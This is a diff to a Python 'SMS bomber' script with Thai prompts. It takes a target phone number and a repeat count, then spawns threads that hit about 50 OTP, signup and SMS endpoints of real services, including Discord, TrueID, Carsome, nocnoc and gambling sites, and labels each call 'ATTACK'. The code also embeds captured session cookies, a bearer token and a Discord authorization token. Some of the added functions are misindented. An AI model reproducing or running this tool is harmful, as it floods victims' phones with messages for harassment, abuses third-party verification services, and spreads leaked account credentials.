@@ -9,7 +9,7 @@ from requests import Session
 from threading import Thread
 os.system('clear')
 
-print("         \033[1;93m[ \033[1;3m\033[1;91mFacebook : \033[1;95mณรงค์ฤทธิ์  \033[1;93m]")
+print("         \033[1;93m[ \033[1;3m\033[1;91mFacebook : \033[1;95mสำรองม่อนท้อ\033[1;93m]")
 print("")
 phone = input("\033[1;3m\033[1;91m» \033[1;96mเบอร์ : \033[1;92m")
 jam = int(input("\033[1;3m\033[1;91m» \033[1;96mจำนวน : \033[1;92m"))
@@ -140,7 +140,166 @@ def api30():
 	requests.post("https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code", data={"phone": phone})
 	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")
 	
+	def api31():
+	requests.post("https://ecomapi.eveandboy.com/v10/user/signup/phone", data={"phone": phone,"password":"123456789Az"})
+	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")
 	
+def api32():
+	requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.SignUp","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/signup/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}","Password":"098098Az","UserAttributes":[{"Name":"name","Value":"Dbdh"},{"Name":"birthdate","Value":"2005-01-01"},{"Name":"gender","Value":"Male"},{"Name":"phone_number","Value":f"+66{phone[1:]}"},{"Name":"custom:phone_country_code","Value":"+66"},{"Name":"custom:is_agreement","Value":"true"},{"Name":"custom:allow_consent","Value":"true"},{"Name":"custom:allow_person_info","Value":"true"}],"ValidationData":[]})
+	requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"cache-control": "max-age=0","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.ResendConfirmationCode","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/resetpass/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}"})
+	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")
+	
+def api33():
+	head = {
+	    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
+	    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+	    "referer": "https://laopun.com/register",
+	    "cookie": "PHPSESSID=q32n008kgetm0tilch7f5qv2qp;_ga=GA1.1.677079826.1639848607;_ga_70EKP2Z28V=GS1.1.1639848607.1.1.1639848745.0"
+	    }
+	requests.get(f"https://laopun.com/send-sms?id={phone}&otp=5153",headers=head)
+	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")
+	
+def api34():
+	requests.post("https://jdbaa.com/api/otp-not-captcha", data={"phone_number":phone})
+	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")
+	
+def api35():
+	head = {
+	    "content-type": "application/json;charset=UTF-8",
+	    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
+	    "accept": "application/json, text/plain, */*",
+	    "referer": "https://www.carsome.co.th/sell-car?gclsrc=aw.ds&&&utm_source=Google&utm_medium=Search&utm_campaign=TH_C2B_Valuation_SmartPhrase_Core_&utm_term=Search_Core_C2B_TH_Perf_Conv_&utm_content=%E0%B8%A3%E0%B8%96%E0%B8%A1%E0%B8%B7%E0%B8%AD%E0%B8%AA%E0%B8%AD%E0%B8%87%E0%B8%A3%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%96%E0%B8%B9%E0%B8%81&gclid=Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB",
+	    "cookie": "_gcl_au=1.1.1272461332.1638187764;G_ENABLED_IDPS=google;_ga=GA1.3.808434087.1638187769;__lt__cid=10b9db7a-fed7-4a04-99d2-cdf99ccd76b8;_gid=GA1.3.1113186157.1639742520;_fbp=fb.2.1639742521800.1608632439;ajs_anonymous_id=fc77ca54-b140-4d14-a811-9be694d4dcfa;_hjSessionUser_1895262=eyJpZCI6IjJmYTg1NjkzLTIwYWUtNTQ3ZC1iYTgyLTZjMTZhNDE4N2VjOSIsImNyZWF0ZWQiOjE2Mzk3NDI1MjIzMDAsImV4aXN0aW5nIjp0cnVlfQ==;_cc_id=c18b09fbdfdf3183761afb6f7799f21d;panoramaId_expiry=1640349594875;panoramaId=052fccf0cccc27f1f255389082ee16d53938c5a780adb183ac3642512b6c17dc;_clck=18ofz7k|1|exd|0;skylab_deviceId=IuD7oBeC61H6n41Z1FH3ek;_gcl_aw=GCL.1639853869.Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB;_gcl_dc=GCL.1639853869.Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB;amp_893e6b=IuD7oBeC61H6n41Z1FH3ek...1fn7egd40.1fn7egjki.1.3.4;__lt__sid=f6ad8bda-06d0796d;_gac_UA-70043720-5=1.1639853872.Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB;_gat_UA-70043720-5=1;_uetsid=23e4ae005f3111ec8d8c79ffb5e7c09b;_uetvid=33f5ca20510d11ec8e1175a84efe64f8;_hjSession_1895262=eyJpZCI6IjY2YWZlZmI0LWMwMDYtNGFkMS1hMWE3LTQ3NDllYmQ2MDNjYSIsImNyZWF0ZWQiOjE2Mzk4NTM4NzU4MDd9;_hjIncludedInPageviewSample=1;_hjAbsoluteSessionInProgress=0;_hjIncludedInSessionSample=0;_clsk=15fms60|1639853877001|1|1|e.clarity.ms/collect"
+	    }
+	requests.post("https://www.carsome.co.th/website/login/sendSMS", headers=head, json={"username":phone,"optType":0}).json()
+	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")
+	
+def api36():
+	head = {
+	    "authorization": "Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..o2KGFaI9sj29aEhCf9hApg.8hkBGU4xqfvuMOjMnNVDZjwqkjUcapX7Nnm4r5NZ-LsHH54KqovZT8OcwskjsUoh0_8NKc7aBicXTwiVy-yR_lly-2hWlWsxCG8cR-ucaKrjhJPzHMoLHdw8TKNeeIq5kGuyTsmB-WVAxDn7G5-v0Q.RkQDS8sYQYMpTilU1VOz1A",
+	    "content-type": "application/json; charset=utf-8",
+	    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
+	    "accept": "*/*",
+	    "referer": "https://nocnoc.com/login",
+	    "cookie": "_gcl_au=1.1.2015626896.1637433514;_ga=GA1.2.2121914407.1637433515;__lt__cid=4ba7a030-4806-44f7-b0bc-eb65b3b9b13f;_fbp=fb.1.1637433519859.82249249;_hjSessionUser_1027858=eyJpZCI6IjExYjI1OTM1LWExZmItNTNjZS1hN2RlLTc4YmQwMjQzNmRkZCIsImNyZWF0ZWQiOjE2Mzc0MzM1MTkwMjUsImV4aXN0aW5nIjp0cnVlfQ==;ajs_anonymous_id=%22b70a4a48-dc6e-407c-9a31-37cb925d24e0%22;__lt__sid=dfc427cb-21404fe4;_gid=GA1.2.1348859339.1639856210;_gat_gaTracker=1;_hjSession_1027858=eyJpZCI6Ijk5MWY0ZjhlLTI0MjAtNDA2YS05MjM0LTJkYTliMzU4OTBkYyIsImNyZWF0ZWQiOjE2Mzk4NTYyMTIyNzV9;_hjIncludedInSessionSample=0;_hjAbsoluteSessionInProgress=0;cto_bundle=hwhaQ19FRiUyRlI5b0h0T1B5YlBlUG1YQzBEWmlxUDhqWDNBT3Qyc0hKVXBsJTJCazNaUlJFMHVMem5DMEh3OEJYUFNnWUI1MGhiSGVkOG9ab3NoUjNMbSUyRnpUd2N4SWU3Q1lnYkZvUnZsJTJGZTVveldmRWliWW5SYWhrJTJCbkxNTmhOaFBSOGNrQlhDRmUwQVpaVW41Q3ElMkJ0Yk9yNVJjVGclM0QlM0Q;_gat_UA-124531227-1=1"
+	    }
+	requests.post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.684",headers=head,json={"lang":"th","userType":"BUYER","locale":"th","orgIdfier":"scg","phone":phone,"type":"signup","otpTemplate":"buyer_signup_otp_message","userParams":{"buyerName":"ฟงฟง ฟงฟว"}})
+	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")
+	
+def api37():
+	requests.post("https://u.icq.net/api/v65/rapi/auth/sendCode", json={"reqId":"39816-1633012470","params":{"phone": phone,"language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}})
+	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")
+	
+def api38():
+	requests.post("https://api.1112delivery.com/api/v1/otp/create", data={'phonenumber': phone,'language': "th"})
+	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")
+	
+def api39():
+	requests.post("https://gccircularlivingshop.com/sms/sendOtp", json={"grant_type":"otp","username": phone,"password":"","client":"ecommerce"},headers={})
+	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")
+	
+def api40():
+	headers={
+	    "organizationcode": "lifestyle",
+	    "content-type": "application/json"
+	    }
+	json = {"operationName":"sendOtp","variables":{"input":{"mobileNumber": phone,"phoneCode":"THA-66"}},"query":"mutation sendOtp($input: SendOTPInput!) {\n  sendOTPRegister(input: $input) {\n    token\n    otpReference\n    expirationOn\n    __typename\n  }\n}\n"}
+	requests.post("https://graph.firster.com/graphql",headers=headers,json=json)
+	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")
+	
+def api41():
+	requests.post("https://m.riches666.com/api/register-otp", data={"brands_id":"60a6563a232a600012521982","agent_register":"60a76a7f233d2900110070e0","tel":phone})
+	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")
+	
+def api42():
+	head = {
+	    "x-requested-with": "XMLHttpRequest",
+	    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+	    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
+	    "accept": "*/*",
+	    "referer": "https://www.pruksa.com/member/register/otp_code",
+	    "cookie": "verify=test;_gcl_au=1.1.1068520588.1638975731;_fbp=fb.1.1638975732655.1853691445;_accept_privacy=1;_gid=GA1.2.1560033587.1639887354;PHPSESSID=p8hr5emvd96q6lu10dm6tmfgt7;exp_last_visit=1639452885;exp_csrf_token=3e1cdd2103438cac128d4e8e653ef743f8311dae;_cbclose=1;_cbclose41932=1;_uid41932=2F6F4EEE.5;_ctout41932=1;exp_last_activity=1639887731;exp_tracker=a%3A3%3A%7Bi%3A0%3Bs%3A24%3A%22member%2Fregister%2Fotp_code%22%3Bi%3A1%3Bs%3A15%3A%22member%2Fregister%22%3Bi%3A2%3Bs%3A19%3A%22member%2Flogin%2Fdialog%22%3B%7D;AWSALB=1Evv6AvajZc8F/H8z876YldEIQEiiMHM+U533XqPouYiJbzSjpgYGJ/8oleAYB8GhBiN5a2/t5RrOgv9hXaVn0r3L0FYGUWyhj8amyU1GgObUn/WRjtvbXGGFanS;AWSALBCORS=1Evv6AvajZc8F/H8z876YldEIQEiiMHM+U533XqPouYiJbzSjpgYGJ/8oleAYB8GhBiN5a2/t5RrOgv9hXaVn0r3L0FYGUWyhj8amyU1GgObUn/WRjtvbXGGFanS;_ga_1S3Q68V0J2=GS1.1.1639887351.6.1.1639887736.0;_ga=GA1.2.1203242697.1638975732;_gat_UA-12021683-1=1;exp_current_url=https%3A%2F%2Fwww.pruksa.com%2Fmember%2Fregister%2Fotp_code"
+	    }
+	requests.post("https://www.pruksa.com/member/member_otp/re_create",headers=head,data=f"required=otp&mobile={phone}")
+	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")
+	
+def api43():
+	head = {
+	    "content-type": "application/json;charset=UTF-8",
+	    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
+	    "accept": "application/json, text/plain, */*",
+	    "referer": "https://vaccine.trueid.net/",
+	    "cookie": "tids=cj6rr5kfn7n5eq48kjvtjshbmm6fl822;visid_incap_2104120=tLQf04X9QQOCL3N5NvNoVFt6lGEAAAAAQUIPAAAAAACBOqMUEW78XaYnxR7kJ7pF;_ga_id=908257605.1637120616;_gcl_au=1.1.781159093.1639210714;_fbp=fb.1.1639210716826.1287073338;visid_incap_2608850=sCqytT60R3yHmHPZaoQgs9WLuGEAAAAAQUIPAAAAAADemRF44I7x0AvVgLWDt3rL;pbjs-pubCommonId=4764c6cc-f296-45a4-873a-5cd0bd43510e;_cc_id=c18b09fbdfdf3183761afb6f7799f21d;unique_user_id=332651712.1639210715;__gads=ID=abe63e684890d998:T=1639484401:S=ALNI_MbXUWyQkNhtJ2m57vxHz6ORO4bxRg;_ga=GA1.2.332651712.1639210715;_gid=GA1.2.465629380.1639888137;_gat_UA-86733131-1=1;_cbclose=1;_cbclose26068=1;_uid26068=B513FC64.8;_ctout26068=1;verify=test;OptanonConsent=isIABGlobal=false&datestamp=Sun+Dec+19+2021+11%3A29%3A09+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.13.0&hosts=&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1%2CC0005%3A1&geolocation=%3B&AwaitingReconsent=false;OptanonAlertBoxClosed=2021-12-19T04:29:09.733Z;_ga_R05PJC3ZG8=GS1.1.1639888134.6.1.1639888160.34"
+	    }
+	requests.post("https://vaccine.trueid.net/vacc-verify/api/getotp",headers=head,json={"msisdn":phone,"function":"enroll"})
+	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")
+	
+def api44():
+	head = {
+	    "x-requested-with": "XMLHttpRequest",
+	    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+	    "accept": "*/*",
+	    "referer": "https://ufa108.ufabetcash.com/register.php",
+	    "cookie": "PHPSESSID=94e150551f39f0b2fcf142b58c21bb77"
+	    }
+	requests.post("https://ufa108.ufabetcash.com/api/",headers=head,data=f"cmd=request_form_register_detail_check&web_account_id=36&auto_bank_group_id=1&m_name=sl&m_surname=ak&m_line=snsb1j&m_bank=4&m_account_number=8572178402&m_from=41&m_phone={phone}")
+	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")
+    
+def api46():
+   requests.post("https://www.qqmoney.ltd/jackey/sms/login",json = {"appId":"5fc9ff297eb51f1196350635","companyId":"5fc9ff12197278da22aff029","mobile": phone},headers={"Content-Type": "application/json;charset=UTF-8"})
+   print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")
+   
+def api47():
+   requests.post("https://www.monomax.me/api/v2/signup/telno",json ={"password":"12345678+","telno": phone})
+   print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")
+   
+def api48():
+   requests.post("https://m.pgwin168.com/api/register-otp",json ={"brands_id":"60e4016f35119800184f34a5","agent_register":"60e57c3b2ead950012fc5fba","tel": phone})
+   print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")
+   
+def api49():
+    requests.post("https://www.som777.com/api/otp/register",json ={"applicant": phone,"serviceName":"SOM777"})
+    print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")
+    
+def api50():
+	requests.post("https://www.konglor888.com/api/otp/register",json = {"applicant": phone,"serviceName":"KONGLOR888"})
+	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")
+	
+def api51():
+	requests.get("https://api.quickcash8.com/v1/login/captcha?timestamp=1636359633&sign=3a11b88fbf58615099d15639e714afcc&token=&version=2.3.2&appsFlyerId=1636346593405-2457389151564256014&platform=android&channel_str=&phone="+phone+"&img_code=", headers = {"Host": "api.quickcash8.com", "Connection": "Keep-Alive", "Accept": "gzip", "User-Agent": "okhttp/3.11.0"})
+	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")
+	
+def api52():
+	requests.get("https://users.cars24.co.th/oauth/consumer-app/otp/"+phone+"?lang=th", headers = {"accept": "application/json, text/plain, */*","x_vehicle_type":"CAR","cookie":"_ga=GA1.3.523508414.1640152799;_gid=GA1.3.999851247.1640152799;_fbp=fb.2.1640152801502.837786780;_gac_UA-65843992-28=1.1640152807.EAIaIQobChMIi9jVo9329AIVizArCh1bFAuMEAAYASAAEgJqA_D_BwE;_dc_gtm_UA-65843992-28=1;_hjSessionUser_2738441=eyJpZCI6IjYwMjMzZjYyLTFlMzYtNWZmMy04MjZkLTMzOTAxNTMwODQ4NyIsImNyZWF0ZWQiOjE2NDAxNTI4MDEzMDYsImV4aXN0aW5nIjp0cnVlfQ==;_hjSession_2738441=eyJpZCI6ImI4MDNlNTFkLTFiYTYtNGExZi05MGIzLTk5OWRmMjhhM2RiOCIsImNyZWF0ZWQiOjE2NDAxNjY4ODgwNDF9;_hjAbsoluteSessionInProgress=0;cto_bundle=uVFzcF8lMkYxM0hsRGxQc1M4YThaRmhHJTJGRTBtSUdwNzVuRkVldzI5QlpIYktWbnZFcUlzdDZ1ZnhMT3JqVVhFQyUyQmtGUE9MTFk5akpyVnl4ekZnZlJ4UVN3WnRHdUNyJTJGWW03aVRSeWtLc2wxTjA3QmR0THNzcjNsJTJCcEJHSXlOUzNxTVc2ZmJPaGclMkZhRUhkV3I2cTI1dXUlMkZhYnl1dyUzRCUzRA"})
+	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")
+	
+def api54():
+	requests = Session()
+	token = search('<meta name="_csrf" content="(.*)" />',requests.get("https://www.shopat24.com/register/").text).group(1)
+	requests.post("https://www.shopat24.com/register/ajax/requestotp/",data=f"phoneNumber={phone}",headers={"content-type": "application/x-www-form-urlencoded; charset=UTF-8","x-csrf-token": token})
+	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")
+            
+def api56():
+	head = {
+	    "Host": "discord.com",
+	    "user-agent": "Discord-Android/106010",
+	    "authorization": "ODk0NDQ4ODI4NTIxMDE3NDE0.YaxE8A.ZBT5aLO80pM-EVa-tlhqgC-Y1WQ",
+	    "x-fingerprint": "914875439896473620.4APgJf_b9a3KWMdy7nPtVmQapMo",
+	    "accept-language": "th",
+	    "x-super-properties": "eyJicm93c2VyIjoiRGlzY29yZCBBbmRyb2lkIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiRGlzY29yZC1BbmRyb2lkLzEwNjAxMCIsImNsaWVudF9idWlsZF9udW1iZXIiOjEwNjAxMCwiY2xpZW50X3ZlcnNpb24iOiIxMDYuMTAgLSBTdGFibGUiLCJkZXZpY2UiOiJBMzdmLCBBMzdmIiwib3MiOiJBbmRyb2lkIiwib3Nfc2RrX3ZlcnNpb24iOiIyMiIsIm9zX3ZlcnNpb24iOiI1LjEuMSIsInN5c3RlbV9sb2NhbGUiOiJ0aC1USCIsImNsaWVudF9wZXJmb3JtYW5jZV9jcHUiOjEwLCJjbGllbnRfcGVyZm9ybWFuY2VfbWVtb3J5IjoxOTk0ODQsImNwdV9jb3JlX2NvdW50Ijo0LCJhY2Nlc3NpYmlsaXR5X3N1cHBvcnRfZW5hYmxlZCI6ZmFsc2UsImFjY2Vzc2liaWxpdHlfZmVhdHVyZXMiOjEyOCwiZGV2aWNlX2FkdmVydGlzZXJfaWQiOiIzNGViOWE0NC05MWVlLTQxYjQtYmE2Yi01MjViNWNmOTc4ODYifQ==",
+	    "content-type": "application/json; charset=UTF-8",
+	    "content-length": "24",
+	    "accept-encoding": "gzip",
+	    "cookie": "__sdcfduid=52dc782d550211ec9eb842010a0a04ee157ecfac811789d73a2f5a5fbc577e07972e624e3ab09b9534c12f6435839742; __dcfduid=52dc782d550211ec9eb842010a0a04ee"
+	    }
+	requests.post("https://discord.com/api/v9/users/@me/phone",headers=head,json={"phone":"+66"+phone})
+	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")
+	
+def api57():
+	requests.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp", data={"mobile_phone_no":phone})
+	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")
+
+
 for i in range(jam):
 	threading.Thread(target=api1).start()
 	threading.Thread(target=api2).start()
@@ -172,3 +331,28 @@ for i in range(jam):
 	threading.Thread(target=api28).start()
 	threading.Thread(target=api29).start()
 	threading.Thread(target=api30).start()
+	threading.Thread(target=api31).start()
+	threading.Thread(target=api32).start()
+	threading.Thread(target=api33).start()
+	threading.Thread(target=api34).start()
+	threading.Thread(target=api35).start()
+	threading.Thread(target=api36).start()
+	threading.Thread(target=api37).start()
+	threading.Thread(target=api38).start()
+	threading.Thread(target=api39).start()
+	threading.Thread(target=api40).start()
+	threading.Thread(target=api41).start()
+	threading.Thread(target=api42).start()
+	threading.Thread(target=api43).start()
+	threading.Thread(target=api44).start()
+	threading.Thread(target=api46).start()
+	threading.Thread(target=api47).start()
+	threading.Thread(target=api48).start()
+	threading.Thread(target=api49).start()
+	threading.Thread(target=api50).start()
+	threading.Thread(target=api51).start()
+	threading.Thread(target=api52).start()
+	threading.Thread(target=api54).start()
+	threading.Thread(target=api56).start()
+	threading.Thread(target=api57).start()
+	
